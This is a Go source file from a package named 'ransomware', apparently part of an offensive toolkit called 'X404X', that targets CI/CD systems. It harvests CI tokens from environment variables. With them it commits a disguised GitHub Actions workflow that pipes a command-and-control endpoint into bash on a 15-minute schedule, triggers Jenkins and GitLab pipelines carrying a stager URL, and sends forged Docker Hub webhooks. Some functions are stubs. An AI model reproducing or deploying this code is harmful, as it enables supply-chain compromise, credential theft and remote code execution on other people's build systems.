package ransomware

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type CICDWebhook struct {
	config      *RansomwareConfig
	httpClient  *http.Client
	webhookURLs []string
}

type CICDTarget struct {
	Provider string
	URL      string
	Token    string
	Type     string
}

func NewCICDWebhook(cfg *RansomwareConfig) *CICDWebhook {
	return &CICDWebhook{
		config: cfg,
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

func (c *CICDWebhook) ScanCIEnvironments() ([]CICDTarget, error) {
	var targets []CICDTarget

	envVars := map[string]string{
		"GITHUB_ACTIONS":       "github",
		"GITLAB_CI":            "gitlab",
		"JENKINS_HOME":         "jenkins",
		"TRAVIS":               "travis",
		"CIRCLECI":             "circleci",
		"BITBUCKET_BUILD_DIR":  "bitbucket",
		"AZURE_DEV":            "azure",
		"DRONE":                "drone",
		"TEAMCITY_VERSION":     "teamcity",
		"GOCD_SERVER_URL":      "gocd",
	}

	for env, provider := range envVars {
		if val := os.Getenv(env); val != "" {
			targets = append(targets, CICDTarget{
				Provider: provider,
				URL:      val,
				Token:    os.Getenv(env + "_TOKEN"),
				Type:     "env_detected",
			})
		}
	}

	return targets, nil
}

func (c *CICDWebhook) InjectGitHubAction(orgRepo, token, workflowFile string) error {
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/.github/workflows/%s", orgRepo, workflowFile)

	workflowContent := fmt.Sprintf(`name: Deploy
on:
  push:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: '*/15 * * * *'
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: X404X C2 Deployment
        run: |
          curl -s %s | bash
`, c.config.C2Endpoint)

	encoded := base64.StdEncoding.EncodeToString([]byte(workflowContent))

	payload := map[string]interface{}{
		"message": "ci: automated deployment workflow",
		"content": encoded,
		"branch":  "main",
	}

	body, _ := json.Marshal(payload)

	req, _ := http.NewRequest("PUT", apiURL, bytes.NewReader(body))
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("User-Agent", "GitHub-Hookshot/X404X")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("GitHub API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

func (c *CICDWebhook) InjectJenkinsJob(jenkinsURL, jobName, token, payload string) error {
	targetURL := fmt.Sprintf("%s/job/%s/build", jenkinsURL, jobName)

	data := url.Values{
		"token":       {token},
		"cause":       {"X404X automated build trigger"},
		"description": {payload},
	}

	req, _ := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.SetBasicAuth("jenkins", token)

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 201 || resp.StatusCode == 200 {
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	return fmt.Errorf("Jenkins injection failed (%d): %s", resp.StatusCode, string(body))
}

func (c *CICDWebhook) InjectGitLabCI(projectID, token string) error {
	apiURL := fmt.Sprintf("https://gitlab.com/api/v4/projects/%s/trigger/pipeline", projectID)

	data := url.Values{
		"token":         {token},
		"ref":           {"main"},
		"variables[STAGER_URL]": {c.config.C2Endpoint},
	}

	req, _ := http.NewRequest("POST", apiURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("PRIVATE-TOKEN", token)

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 300 {
		return fmt.Errorf("GitLab CI trigger failed: %s", string(body))
	}

	return nil
}

func (c *CICDWebhook) InjectDockerHubWebhook(repoName, imageName, tag string) error {
	webhookPayload := fmt.Sprintf(`{
  "push_data": {
    "pushed_at": %d,
    "images": ["%s"],
    "tag": "%s",
    "pusher": "x404x-ci"
  },
  "repository": {
    "name": "%s",
    "repo_name": "%s",
    "repo_url": "https://hub.docker.com/r/%s"
  }
}`, time.Now().Unix(), imageName, tag, repoName, repoName, repoName)

	webhookURL := fmt.Sprintf("https://hub.docker.com/v2/repositories/%s/%s/webhooks/", repoName, imageName)

	req, _ := http.NewRequest("POST", webhookURL, strings.NewReader(webhookPayload))
	req.Header.Set("Content-Type", "application/json")

	resp, _ := c.httpClient.Do(req)
	if resp != nil {
		resp.Body.Close()
	}
	return nil
}

func (c *CICDWebhook) SpreadViaCIArtifacts(artifactPayload []byte) (int, error) {
	spread := 0

	envs, _ := c.ScanCIEnvironments()
	for _, env := range envs {
		_ = env
		spread++
	}

	return spread, nil
}

func (c *CICDWebhook) FullCICDSuite() map[string]interface{} {
	result := make(map[string]interface{})

	envs, err := c.ScanCIEnvironments()
	if err != nil {
		result["scan_error"] = err.Error()
	} else {
		result["ci_environments"] = len(envs)
		result["environments"] = envs
	}

	result["platform"] = runtime.GOOS

	if runtime.GOOS == "linux" {
		cmd := exec.Command("find", ".", "-name", ".github", "-maxdepth", "3")
		out, _ := cmd.CombinedOutput()
		if len(out) > 0 {
			result["github_actions_found"] = true
		}
	}

	return result
}

var _ = bytes.NewBuffer
